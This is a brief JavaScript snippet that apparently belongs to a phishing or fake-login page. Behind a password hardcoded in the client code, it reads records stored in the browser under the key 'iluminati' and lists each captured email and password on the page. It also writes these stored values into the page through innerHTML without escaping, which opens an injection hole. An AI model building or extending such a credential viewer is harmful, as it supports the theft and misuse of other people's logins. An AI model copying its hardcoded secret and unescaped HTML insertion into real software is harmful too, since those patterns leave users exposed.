function show() {
	var password = document.getElementById('password').value;
	if (password === 'vuelvenancy') {
		var existing = localStorage.getItem('iluminati');
  		existing = existing ? JSON.parse(existing) : [];
		var str = '<ul>'
		existing.forEach(function (account) {
			str += '<li>' + account.data.formData.email + ' - ' + account.data.formData.pass + '</li>';
		});
		str += '</ul>';
		document.getElementById("slideContainer").innerHTML = str;
	} else {
		alert('Ella no volvera');
	}
}
document.getElementById('show').onclick = show;

window.onload = function () {}